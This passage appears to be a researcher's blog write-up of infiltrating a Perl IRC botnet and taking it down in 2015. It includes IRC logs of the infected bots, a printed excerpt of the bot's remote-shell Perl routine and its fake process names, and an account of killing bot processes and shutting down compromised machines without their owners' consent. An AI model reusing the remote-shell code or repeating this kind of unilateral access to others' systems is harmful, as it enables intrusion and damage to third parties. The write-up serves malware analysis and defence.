        21:37 -!-        #.f MiKuTs458 Hx  3  ~vub@SfJ7KI.io0NdQ.virtual [Linux 2.6.32-573.3.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs206 Hx  3  ~Qcz@B30czG.EwV0Ud.virtual [Linux 2.6.32-573.3.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs564 Hx  3  ~xhc@h1nJPs.pLW601.virtual [Linux 3.13.0-32-generic]
        21:37 -!-        #.f MiKuTs812 Hx  3  ~AjB@p65KXf.G9EHlX.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs575 Hx  3  ~5re@olldVD.Dw0hv5.virtual [Linux 2.6.32-504.12.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs132 Hx  3  ~65h@b5776b.GtwGPu.virtual [Linux 3.10.0-229.el7.x86_64]
        21:37 -!-        #.f MiKuTs78  Hx  3  ~9er@U3lcZj.PpKulx.virtual [Linux 3.10.0-229.1.2.el7.x86_64]
        21:37 -!-        #.f MiKuTs508 H+x 3  ~9zq@WJR6SJ.6iAfcE.virtual [Linux 2.6.26-2-686]
        21:37 -!-        #.f MiKuTs477 Hx  3  ~9nc@0M1fCT.H90Rr0.virtual [Linux 2.6.22.9]
        21:37 -!-        #.f Alex      H*@x 3  ~alex@alex.ro [*]
        21:37 -!-        #.f MiKuTs292 Hx  3  ~cvs@zbL225.STH2vu.virtual [Linux 2.6.9-67.ELsmp]
        21:37 -!-        #.f Doru      H@x 3  ~PruncuTz@H29JyI.lifwdL.virtual [...]
        21:37 -!-        #.f MiKuTs868 Hx  3  ~I77@KqcNNY.YY8mGj.virtual [Linux 2.2.14-6.1.1smp]
        21:37 -!-        #.f MiKuTs107 Hx  3  ~l6o@GWgPiu.Iy1EZV.virtual [Linux 2.6.22.9]
        21:37 -!-        #.f snoopgirl Hx  3  ~bluebus@qexb3B.cnOw0q.virtual [devasto]
        21:37 -!-        #.f x         H*@x 3  ~old@xxx [old]
        21:37 -!-        #.f MiKuTs633 Hx  3  ~Lyu@22svja.bv5eod.virtual [Linux 2.6.9-100.ELsmp]
        21:37 -!-        #.f MiKuTs716 Hx  3  ~n4e@zZ5bER.aYUB9r.virtual [Linux 2.6.18-348.3.1.el5]
        21:37 -!-        #.f MiKuTs470 Hx  3  ~idp@DoMN7U.CH7CcK.virtual [Linux 2.6.32-042stab105.14]
        21:37 -!-        #.f MiKuTs342 Hx  3  ~ism@ATFpXt.VYx1zy.virtual [Linux 2.6.31.14-0.8-default]
        21:37 -!-        #.f MiKuTs344 Hx  3  ~grw@KKMDj4.KDuUKl.virtual [Linux 2.6.32-431.el6.i686]
        21:37 -!-        #.f MiKuTs756 Hx  3  ~tmw@hIYAjI.8dCX9z.virtual [Linux 2.6.18-128.7.1.el5]
        21:37 -!-        #.f MiKuTs86  Hx  3  ~S3K@eoha03.XnNm2G.virtual [Linux 2.6.17.3-kuroboxHG]
        21:37 -!-        #.f MiKuTs883 Hx  3  ~ALJ@20Sk94.LM0xJY.virtual [Linux 2.6.23.17-89.fc7]
        21:37 -!-        #.f MiKuTs96  Hx  3  ~P9d@42aNRr.89rx0b.virtual [Linux 2.6.18-028stab101.1]
        21:37 -!-        #.f MiKuTs514 Hx  3  ~QVl@m7g1fu.Q0NUCV.virtual [Linux 2.6.18-238.19.1.el5]
        21:37 -!-        #.f MiKuTs544 Hx  3  ~VjB@tmJbQ0.A6dFwj.virtual [Linux 3.13.0-45-generic]
        21:37 -!-        #.f MiKuTs711 Hx  3  ~AuN@1xwPlv.48jH0b.virtual [Linux 2.6.18-164.el5]
        21:37 -!-        #.f MiKuTs64  Hx  3  ~MZc@B766QY.0IUfTz.virtual [Linux 2.6.18-164.el5xen]
        21:37 -!-        #.f MiKuTs732 Hx  3  ~POK@strhoR.k5lhXE.virtual [Linux 2.6.18-128.el5]
        21:37 -!-        #.f MiKuTs860 Hx  3  ~LPP@FtooOu.qOdw31.virtual [Linux 2.6.24-23-server]
        21:37 -!-        #.f MiKuTs229 Hx  3  ~zx3@UrmCKC.fL50j0.virtual [Linux 2.6.18-164.el5]
        21:37 -!-        #.f MiKuTs572 Hx  3  ~Ykt@7X7N0f.Fo2jJe.virtual [Linux 2.6.18-194.26.1.el5xen]
        21:37 -!-        #.f MiKuTs212 Hx  3  ~U9r@ouFj0k.EkHuMZ.virtual [Linux 2.6.26-2-xen-686]
        21:37 -!-        #.f MiKuTs309 Hx  3  ~gpm@hQzDkb.GzwGiG.virtual [Linux 2.6.18-308.el5PAE]
        21:37 -!-        #.f MiKuTs258 Hx  3  ~ffe@ogKNWS.5blCqb.virtual [Linux 2.6.18-194.17.1.el5]
        21:37 -!-        #.f MiKuTs692 Hx  3  ~rrm@rLBRAr.bWMrc0.virtual [Linux 2.6.32-279.5.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs140 Hx  3  ~Hip@a7zN7q.uhD5Pn.virtual [Linux 2.6.18-194.el5xen]
        21:37 -!-        #.f MiKuTs452 Hx  3  ~occ@J5Zgpb.gluJGa.virtual [Linux 2.6.18-194.el5PAE]
        21:37 -!-        #.f MiKuTs893 Hx  3  ~J18@HG4eV0.TIsbC7.virtual [Linux 3.11.10-301.fc20.i686+PAE]
        21:37 -!-        #.f MiKuTs238 Hx  3  ~ttp@kwIP5t.GgTZ5L.virtual [Linux 2.6.18-164.el5]
        21:37 -!-        #.f MiKuTs111 Hx  3  ~WxS@fLpnIk.XnQY9I.virtual [Linux 2.6.39.4-13]
        21:37 -!-        #.f MiKuTs756 Hx  3  ~tmw@hIYAjI.8dCX9z.virtual [Linux 2.6.18-128.7.1.el5]
        21:37 -!-        #.f MiKuTs86  Hx  3  ~S3K@eoha03.XnNm2G.virtual [Linux 2.6.17.3-kuroboxHG]
        21:37 -!-        #.f MiKuTs883 Hx  3  ~ALJ@20Sk94.LM0xJY.virtual [Linux 2.6.23.17-89.fc7]
        21:37 -!-        #.f MiKuTs96  Hx  3  ~P9d@42aNRr.89rx0b.virtual [Linux 2.6.18-028stab101.1]
        21:37 -!-        #.f MiKuTs514 Hx  3  ~QVl@m7g1fu.Q0NUCV.virtual [Linux 2.6.18-238.19.1.el5]
        21:37 -!-        #.f MiKuTs544 Hx  3  ~VjB@tmJbQ0.A6dFwj.virtual [Linux 3.13.0-45-generic]
        21:37 -!-        #.f MiKuTs711 Hx  3  ~AuN@1xwPlv.48jH0b.virtual [Linux 2.6.18-164.el5]
        21:37 -!-        #.f MiKuTs64  Hx  3  ~MZc@B766QY.0IUfTz.virtual [Linux 2.6.18-164.el5xen]
        21:37 -!-        #.f MiKuTs732 Hx  3  ~POK@strhoR.k5lhXE.virtual [Linux 2.6.18-128.el5]
        21:37 -!-        #.f MiKuTs860 Hx  3  ~LPP@FtooOu.qOdw31.virtual [Linux 2.6.24-23-server]
        21:37 -!-        #.f MiKuTs229 Hx  3  ~zx3@UrmCKC.fL50j0.virtual [Linux 2.6.18-164.el5]
        21:37 -!-        #.f MiKuTs572 Hx  3  ~Ykt@7X7N0f.Fo2jJe.virtual [Linux 2.6.18-194.26.1.el5xen]
        21:37 -!-        #.f MiKuTs212 Hx  3  ~U9r@ouFj0k.EkHuMZ.virtual [Linux 2.6.26-2-xen-686]
        21:37 -!-        #.f MiKuTs309 Hx  3  ~gpm@hQzDkb.GzwGiG.virtual [Linux 2.6.18-308.el5PAE]
        21:37 -!-        #.f MiKuTs258 Hx  3  ~ffe@ogKNWS.5blCqb.virtual [Linux 2.6.18-194.17.1.el5]
        21:37 -!-        #.f MiKuTs692 Hx  3  ~rrm@rLBRAr.bWMrc0.virtual [Linux 2.6.32-279.5.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs140 Hx  3  ~Hip@a7zN7q.uhD5Pn.virtual [Linux 2.6.18-194.el5xen]
        21:37 -!-        #.f MiKuTs452 Hx  3  ~occ@J5Zgpb.gluJGa.virtual [Linux 2.6.18-194.el5PAE]
        21:37 -!-        #.f MiKuTs893 Hx  3  ~J18@HG4eV0.TIsbC7.virtual [Linux 3.11.10-301.fc20.i686+PAE]
        21:37 -!-        #.f MiKuTs238 Hx  3  ~ttp@kwIP5t.GgTZ5L.virtual [Linux 2.6.18-164.el5]
        21:37 -!-        #.f MiKuTs111 Hx  3  ~WxS@fLpnIk.XnQY9I.virtual [Linux 2.6.39.4-13]
        21:37 -!-        #.f MiKuTs571 Hx  3  ~GCy@JR07wP.7UPD5V.virtual [Linux 2.6.32-220.7.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs281 Hx  3  ~SqU@PKcuk8.VjljOM.virtual [Linux 2.6.18-194.32.1.el5xen]
        21:37 -!-        #.f MiKuTs638 Hx  3  ~d7o@LlwZKC.Z97n48.virtual [Linux 2.6.18-308.20.1.el5PAE]
        21:37 -!-        #.f MiKuTs21  Hx  3  ~dev@bHASbo.J8UltW.virtual [Linux 2.6.18-028stab101.1-ent]
        21:37 -!-        #.f MiKuTs303 Hx  3  ~nkt@pt80S2.D9D3v0.virtual [Linux 2.6.25.20-0.5-default]
        21:37 -!-        #.f MiKuTs109 Hx  3  ~L9u@dYv18o.vXEjFP.virtual [Linux 2.6.22.9]
        21:37 -!-        #.f MiKuTs178 Hx  3  ~AhY@l09504.oYlw7s.virtual [Linux 2.6.18-128.el5PAE]
        21:37 -!-        #.f MiKuTs442 Hx  3  ~S4p@Tnl7d0.0eEJ9H.virtual [Linux 2.6.32-042stab079.5]
        21:37 -!-        #.f MiKuTs367 Hx  3  ~T2Q@vI96ys.Y9RxXd.virtual [Linux 2.6.18-308.20.1.el5]
        21:37 -!-        #.f MiKuTs487 Hx  3  ~gbx@bGx8z0.mMbi5X.virtual [Linux 2.6.32-042stab084.14]
        21:37 -!-        #.f MiKuTs920 Hx  3  ~6et@Oikhs2.iGLPt0.virtual [Linux 2.6.32-042stab081.8]
        21:37 -!-        #.f MiKuTs745 Hx  3  ~azt@JzsS5T.4dbqtZ.virtual [Linux 2.6.32-042stab076.7]
        21:37 -!-        #.f MiKuTs400 Hx  3  ~Ese@R1TFr5.BaTJer.virtual [Linux 2.6.18-028stab091.2-ent]
        21:37 -!-        #.f MiKuTs123 Hx  3  ~Zjh@pCHGuw.MGZcKh.virtual [Linux 2.6.27.34rootserver-20090918a]
        21:37 -!-        #.f MiKuTs408 Hx  3  ~LGg@yqLPjC.wy07NU.virtual [Linux 2.6.32-531.29.2.lve1.3.11.10.el6.x86_64]
        21:37 -!-        #.f MiKuTs744 Hx  3  ~sqb@3WX50A.RRjVks.virtual [Linux 2.6.26-2-686]
        21:37 -!-        #.f MiKuTs542 Hx  3  ~11s@0dddRa.C010Ga.virtual [Linux 2.4.18-1-686-smp]
        21:37 -!-        #.f MiKuTs607 Hx  3  ~2og@3WFw2N.r1660w.virtual [Linux 2.6.32-openvz-042stab104.1-amd64]
        21:37 -!-        #.f MiKuTs846 Hx  3  ~OH7@8NdoEA.7jKMmf.virtual [Linux 2.6.32-431.3.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs205 Hx  3  ~wxx@JhB5m2.YDDBY0.virtual [Linux 2.6.18-194.el5PAE]
        21:37 -!-        #.f MiKuTs73  Hx  3  ~XNW@XnJjAO.H3mzkw.virtual [Linux 2.4.21-63.ELsmp]
        21:37 -!-        #.f MiKuTs571 Hx  3  ~GCy@JR07wP.7UPD5V.virtual [Linux 2.6.32-220.7.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs281 Hx  3  ~SqU@PKcuk8.VjljOM.virtual [Linux 2.6.18-194.32.1.el5xen]
        21:37 -!-        #.f MiKuTs638 Hx  3  ~d7o@LlwZKC.Z97n48.virtual [Linux 2.6.18-308.20.1.el5PAE]
        21:37 -!-        #.f MiKuTs21  Hx  3  ~dev@bHASbo.J8UltW.virtual [Linux 2.6.18-028stab101.1-ent]
        21:37 -!-        #.f MiKuTs303 Hx  3  ~nkt@pt80S2.D9D3v0.virtual [Linux 2.6.25.20-0.5-default]
        21:37 -!-        #.f MiKuTs109 Hx  3  ~L9u@dYv18o.vXEjFP.virtual [Linux 2.6.22.9]
        21:37 -!-        #.f MiKuTs178 Hx  3  ~AhY@l09504.oYlw7s.virtual [Linux 2.6.18-128.el5PAE]
        21:37 -!-        #.f MiKuTs442 Hx  3  ~S4p@Tnl7d0.0eEJ9H.virtual [Linux 2.6.32-042stab079.5]
        21:37 -!-        #.f MiKuTs367 Hx  3  ~T2Q@vI96ys.Y9RxXd.virtual [Linux 2.6.18-308.20.1.el5]
        21:37 -!-        #.f MiKuTs487 Hx  3  ~gbx@bGx8z0.mMbi5X.virtual [Linux 2.6.32-042stab084.14]
        21:37 -!-        #.f MiKuTs920 Hx  3  ~6et@Oikhs2.iGLPt0.virtual [Linux 2.6.32-042stab081.8]
        21:37 -!-        #.f MiKuTs745 Hx  3  ~azt@JzsS5T.4dbqtZ.virtual [Linux 2.6.32-042stab076.7]
        21:37 -!-        #.f MiKuTs400 Hx  3  ~Ese@R1TFr5.BaTJer.virtual [Linux 2.6.18-028stab091.2-ent]
        21:37 -!-        #.f MiKuTs123 Hx  3  ~Zjh@pCHGuw.MGZcKh.virtual [Linux 2.6.27.34rootserver-20090918a]
        21:37 -!-        #.f MiKuTs408 Hx  3  ~LGg@yqLPjC.wy07NU.virtual [Linux 2.6.32-531.29.2.lve1.3.11.10.el6.x86_64]
        21:37 -!-        #.f MiKuTs744 Hx  3  ~sqb@3WX50A.RRjVks.virtual [Linux 2.6.26-2-686]
        21:37 -!-        #.f MiKuTs542 Hx  3  ~11s@0dddRa.C010Ga.virtual [Linux 2.4.18-1-686-smp]
        21:37 -!-        #.f MiKuTs607 Hx  3  ~2og@3WFw2N.r1660w.virtual [Linux 2.6.32-openvz-042stab104.1-amd64]
        21:37 -!-        #.f MiKuTs846 Hx  3  ~OH7@8NdoEA.7jKMmf.virtual [Linux 2.6.32-431.3.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs205 Hx  3  ~wxx@JhB5m2.YDDBY0.virtual [Linux 2.6.18-194.el5PAE]
        21:37 -!-        #.f MiKuTs73  Hx  3  ~XNW@XnJjAO.H3mzkw.virtual [Linux 2.4.21-63.ELsmp]
        21:37 -!-        #.f MiKuTs17  Hx  3  ~9uz@EDh0J8.DaC3u0.virtual [Linux 2.6.18-92.1.1.el5.028stab057.2]
        21:37 -!-        #.f MiKuTs214 Hx  3  ~EkU@5EHf0A.mfwvjf.virtual [Linux 2.6.32-042stab108.5]
        21:37 -!-        #.f MiKuTs230 Hx  3  ~ZT2@iMXp0I.DVAfeN.virtual [Linux 2.6.18-194.26.1.el5.centos.plus]
        21:37 -!-        #.f MiKuTs643 Hx  3  ~TQI@hf0V8i.tYibyb.virtual [Linux 2.6.32-042stab081.8]
        21:37 -!-        #.f MiKuTs637 Hx  3  ~cto@potfqV.ZbQO3K.virtual [Linux 2.6.32-042stab108.2]
        21:37 -!-        #.f MiKuTs967 Hx  3  ~HGU@3NeIDO.E4JTw4.virtual [Linux 2.6.18-028stab092.1]
        21:37 -!-        #.f MiKuTs961 Hx  3  ~IBj@5hwX0Q.qyRjVd.virtual [Linux 2.6.32-042stab108.2]
        21:37 -!-        #.f MiKuTs677 Hx  3  ~ltc@VdVo0u.F00l8S.virtual [Linux 2.6.18-308.8.1.el5.centos.plus]
        21:37 -!-        #.f MiKuTs555 Hx  3  ~ShK@i39MXa.6iXfOL.virtual [Linux 2.6.32-042stab084.14]
        21:37 -!-        #.f MiKuTs438 Hx  3  ~ktz@W4230E.wXBWAJ.virtual [Linux 2.6.24.4]
        21:37 -!-        #.f MiKuTs927 Hx  3  ~PGR@HQNwch.Vcauj0.virtual [Linux 2.6.32-431.11.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs700 Hx  3  ~5nh@8ZcH3y.Oe5Px9.virtual [Linux 2.6.32-220.el6.x86_64]
        21:37 -!-        #.f MiKuTs576 Hx  3  ~C1V@yPaCT7.Z70MpH.virtual [Linux 2.4.25]
        21:37 -!-        #.f MiKuTs456 Hx  3  ~2v2@g60crr.Zdl8HI.virtual [Linux 2.6.18-238.19.1.el5]
        21:37 -!-        #.f MiKuTs586 Hx  3  ~2jh@KiXyE0.Cz0SRW.virtual [Linux 2.6.32-042stab081.8]
        21:37 -!-        #.f MiKuTs462 Hx  3  ~E15@1g0Wnc.xgC1yz.virtual [Linux 2.6.32-279.5.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs315 Hx  3  ~Oqa@ve2RQ8.Fye4wx.virtual [Linux 2.6.32-279.5.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs531 Hx  3  ~pfo@9bV5i4.90o0su.virtual [Linux 2.6.32-279.14.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs382 Hx  3  ~9h6@95UYxn.ejPl1L.virtual [Linux 2.6.32-042stab084.14]
        21:37 -!-        #.f MiKuTs88  Hx  3  ~46f@Fkq311.fOvh2l.virtual [Linux 2.6.32-71.el6.x86_64]
        21:37 -!-        #.f MiKuTs151 Hx  3  ~1sj@xgbBJt.8CdDLQ.virtual [Linux 2.6.34.6-xxxx-std-ipv6-64]
        21:37 -!-        #.f MiKuTs17  Hx  3  ~9uz@EDh0J8.DaC3u0.virtual [Linux 2.6.18-92.1.1.el5.028stab057.2]
        21:37 -!-        #.f MiKuTs214 Hx  3  ~EkU@5EHf0A.mfwvjf.virtual [Linux 2.6.32-042stab108.5]
        21:37 -!-        #.f MiKuTs230 Hx  3  ~ZT2@iMXp0I.DVAfeN.virtual [Linux 2.6.18-194.26.1.el5.centos.plus]
        21:37 -!-        #.f MiKuTs643 Hx  3  ~TQI@hf0V8i.tYibyb.virtual [Linux 2.6.32-042stab081.8]
        21:37 -!-        #.f MiKuTs637 Hx  3  ~cto@potfqV.ZbQO3K.virtual [Linux 2.6.32-042stab108.2]
        21:37 -!-        #.f MiKuTs967 Hx  3  ~HGU@3NeIDO.E4JTw4.virtual [Linux 2.6.18-028stab092.1]
        21:37 -!-        #.f MiKuTs961 Hx  3  ~IBj@5hwX0Q.qyRjVd.virtual [Linux 2.6.32-042stab108.2]
        21:37 -!-        #.f MiKuTs677 Hx  3  ~ltc@VdVo0u.F00l8S.virtual [Linux 2.6.18-308.8.1.el5.centos.plus]
        21:37 -!-        #.f MiKuTs555 Hx  3  ~ShK@i39MXa.6iXfOL.virtual [Linux 2.6.32-042stab084.14]
        21:37 -!-        #.f MiKuTs438 Hx  3  ~ktz@W4230E.wXBWAJ.virtual [Linux 2.6.24.4]
        21:37 -!-        #.f MiKuTs927 Hx  3  ~PGR@HQNwch.Vcauj0.virtual [Linux 2.6.32-431.11.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs700 Hx  3  ~5nh@8ZcH3y.Oe5Px9.virtual [Linux 2.6.32-220.el6.x86_64]
        21:37 -!-        #.f MiKuTs576 Hx  3  ~C1V@yPaCT7.Z70MpH.virtual [Linux 2.4.25]
        21:37 -!-        #.f MiKuTs456 Hx  3  ~2v2@g60crr.Zdl8HI.virtual [Linux 2.6.18-238.19.1.el5]
        21:37 -!-        #.f MiKuTs586 Hx  3  ~2jh@KiXyE0.Cz0SRW.virtual [Linux 2.6.32-042stab081.8]
        21:37 -!-        #.f MiKuTs462 Hx  3  ~E15@1g0Wnc.xgC1yz.virtual [Linux 2.6.32-279.5.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs315 Hx  3  ~Oqa@ve2RQ8.Fye4wx.virtual [Linux 2.6.32-279.5.2.el6.x86_64]
        21:37 -!-        #.f MiKuTs531 Hx  3  ~pfo@9bV5i4.90o0su.virtual [Linux 2.6.32-279.14.1.el6.x86_64]
        21:37 -!-        #.f MiKuTs382 Hx  3  ~9h6@95UYxn.ejPl1L.virtual [Linux 2.6.32-042stab084.14]
        21:37 -!-        #.f MiKuTs88  Hx  3  ~46f@Fkq311.fOvh2l.virtual [Linux 2.6.32-71.el6.x86_64]
        21:37 -!-        #.f MiKuTs151 Hx  3  ~1sj@xgbBJt.8CdDLQ.virtual [Linux 2.6.34.6-xxxx-std-ipv6-64]
        21:37 -!-        #.f MiKuTs23  Hx  3  ~Yar@cKJCx1.sqzlqd.virtual [Linux 2.6.18-128.el5]
        21:37 -!-        #.f MiKuTs941 Hx  3  ~knr@GLcU7Q.iL2IuM.virtual [Linux 2.6.32-358.2.1.el6.i686]
        21:37 -!-        #.f MiKuTs113 Hx  3  ~327@f2ZN7Y.hLZBNN.virtual [Linux 2.6.32-358.6.1.el6.i686]
        21:37 -!- End of /WHO list
        21:37 -!- Doru [~PruncuTz@H29JyI.lifwdL.virtual]
        21:37 -!-  ircname  : ...
        21:37 -!-  channels : @#.f
        21:37 -!-  server   : *.diesel.bounceme.net [diesel.bounceme.net]
        21:37 -!- End of WHOIS
        21:37 -!- x [~old@xxx]
        21:37 -!-  ircname  : old
        21:37 -!-  channels : @#.f
        21:37 -!-  server   : *.diesel.bounceme.net [diesel.bounceme.net]
        21:37 -!-           : IRC Operator
        21:37 -!- End of WHOIS
        21:37 -!- Culea [~Adrian@pula.mea.ro]
        21:37 -!-  ircname  : x
        21:37 -!-  channels : @#.f
        21:37 -!-  server   : *.diesel.bounceme.net [diesel.bounceme.net]
        21:37 -!-           : IRC Operator
        21:37 -!- End of WHOIS

<a name="shutdown"></a>

## Shutting it down

After hanging in there longer and analysing the Perl script I found out that a botherder can query any of the bots which grants a bash shell on that machine which got infected. Due the fact that the IP's are camouflaged in that network and the botherders where activily hardly using the bots I came to the conclusion to kill the process of the bot. Trying to gain all the IP's and then sending information to ISP would take many time and also would not grant much access. So my thought was taking a few bots down and hoping the botherdes fell in panic then, shutting the botnet down or abandoning it.

<blockquote class="twitter-tweet" lang="de"><p lang="en" dir="ltr">Mass shutdown to all perl botnet nodes is executed :)<a href="https://twitter.com/wirehack7">@wirehack7</a> <a href="https://twitter.com/hashtag/lol?src=hash">#lol</a> &#10;Case: <a href="https://t.co/uLEwAFWRgx">https://t.co/uLEwAFWRgx</a>&#10;<a href="https://twitter.com/hashtag/MoronsGonnaCry?src=hash">#MoronsGonnaCry</a> <a href="http://t.co/v08Vy58qSA">pic.twitter.com/v08Vy58qSA</a></p>&mdash; ☩MalwareMustDie (@MalwareMustDie) <a href="https://twitter.com/MalwareMustDie/status/645340974705545216">19. September 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


## Analysis

        sub shell {
          return unless $acessoshell;
          my $printl=$_[0];
          my $comando=$_[1];
          if ($comando =~ /cd (.*)/) {
            chdir("$1") || msg("$printl", "Diret?rio inexistente!");
            return;
          }
          elsif ($pid = fork) {
             waitpid($pid, 0);
          } else {
              if (fork) {
                 exit;
               } else {
                   my @resp=`$comando 2>&1 3>&1`;
                   my $c=0;
                   foreach my $linha (@resp) {
                     $c++;
                     chop $linha;
                     sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
                     if ($c >= "$linas_max") {
                       $c=0;
                       sleep $sleep;
                     }
                   }
                   exit;
               }
          }
        }

So I had two goals: 1.) gain an operator nickname, 2.) drop the commands to each bot to kill the process

## Why we should take this down

The machines got already infected and beeing abused, attacking other targets in WWW, DDoS'ing them and infecting them. So the botnet grows. The infection just started and growing, the last time it was infected it affected more than 400 linux boxes. If we give them more time they infect even more and the damage grows. Yes LE and ISP might act, read **might**. Giving the crooks more time increases damage and cleaning up will get even more complicated. So we have to do the dirty job and clean up the mess. We have no option, if they reboot the boxes, they gain root access, no way we can stop them after that.
An proof of that is here: [http://pastebin.com/TQhENUK0](http://pastebin.com/TQhENUK0). This seems like the same actor, they updated their *ircd*.
Report was also done to Korean CERT, but weekend process will be slow and we are running out of time here. The surveillance in IRC channels show that they are on to root every boxes and ready to reboot each of them. By the time they reboot the boxes with root they can change to every box they owned and put new ircd in there, so we have to act quickly.

## Kill it with fire

After I did some fairy magic and paniced on of the herders out I gained his nickname. I could not drop commands in the channel because I had no chance to gain *+o* (operator status), for that one of the others would have to grant it to me or I have to become an IRC operator, which was impossible because it was hostmask restricted.

The malicious bot process camouflaged itself with these process strings:

        my @ps = ("/usr/local/apache/bin/httpd -DSSL","/sbin/syslogd","[eth0]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[bash]");

So we have to search for these processes and kill them.

![Killing processes](https://i.imgur.com/Y7HdfXt.png)

![Shutting down](https://i.imgur.com/lh7BlZI.png)


If **root** got inftected I shut it down. Why? Because then they can even do more cruel things. I left a message for the admin (which I wont expose here) and ran *shutdown*.
No! some of you might shouting. Yes! I say. Problem here is, the botnet was used activily, the botnet infected other machines, more and more damage was caused. Killing bot process or shutting down when root was a way to shorten the damage. Yes, it was the harsh way, but the fastest.

I did that several times, they had 134 connections, after I finished they had 36 and abondoned the botnet.

        02:51 -!- Channel Users  Name
        02:51 -!- #.f 36
        02:51 -!- End of /LIST

*#.f* is the command and control channel.

![](https://i.imgur.com/BblMiGY.png)

## Conclusion

As you can see, it is not that complicated to shut such a botnet down, problem is that they are created too fast and too easy. Scriptkiddies like that, also the easy way to handle it. So secure your server and don't let them in. Also secure your router! Router are getting more and more in the focus to be attacked and infected.
As we also can see the bot itself is really poorly coded, for me it looks like a copy paste session with adding a few own lines. The scriptkiddies even don't think of morality, maybe it's missed to educate it to them. Also these days it is so 'cool' to be a badass 'hacker'. It is not, punishment will come, sooner or later, and then the tears are big. Like we cached one of them and he will get in real trouble now.

<blockquote class="twitter-tweet" lang="de"><p lang="en" dir="ltr"><a href="https://twitter.com/DoerteDev">@DoerteDev</a> <a href="https://twitter.com/datapacke7">@datapacke7</a> <a href="https://twitter.com/da_667">@da_667</a> <a href="https://twitter.com/wirehack7">@wirehack7</a> <a href="https://twitter.com/Hulk_Crusader">@Hulk_Crusader</a> one botherder is on pool IP &quot;naked&quot;, good for ID (pic) <a href="http://t.co/a8Rza8pa6D">pic.twitter.com/a8Rza8pa6D</a></p>&mdash; ☩MalwareMustDie (@MalwareMustDie) <a href="https://twitter.com/MalwareMustDie/status/645379218734379008">19. September 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

## After takedown

        13:43 < Alex> MiKuTs1247 w
        13:43 < Alex> MiKuTs1247 id
        13:43 < Alex> who the fuck are yo
        13:43 < Alex> who the fuck are you ?
        13:44 < Culea> do you want to fuck you ?
        13:44 < Culea> i`m a albanos
        13:44 < Culea> and i fuck you mom
        13:44 -!- #.f You're not channel operator
        13:44 < Culea> go fuck you self
        13:44 < Culea> loser

## Additional information

**VERSION** strings (not all, just an overview):

        02:44 CTCP VERSION reply from MiKuTs132: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs756: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs86: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs344: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs64: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs229: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs205: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs732: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs140: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs544: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs178: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs292: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs452: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs238: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs607: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs711: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs222: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs363: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs812: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs470: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs859: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs858: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs668: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs23: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs458: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs302: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs442: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs96: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs160: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs111: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs831: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs342: mIRC v6.16 Khaled Mardam-Bey
        02:44 CTCP VERSION reply from MiKuTs335: mIRC v6.16 Khaled Mardam-Bey

        Botherders:

        02:44 CTCP VERSION reply from Doru: mIRC v7.43
        02:44 CTCP mIRC reply from snoopgirl: v6.17 Khaled Mardam-Bey


**Big thanks to [@unixfreaxjp](https://twitter.com/unixfreaxjp) for his never ending support.**  
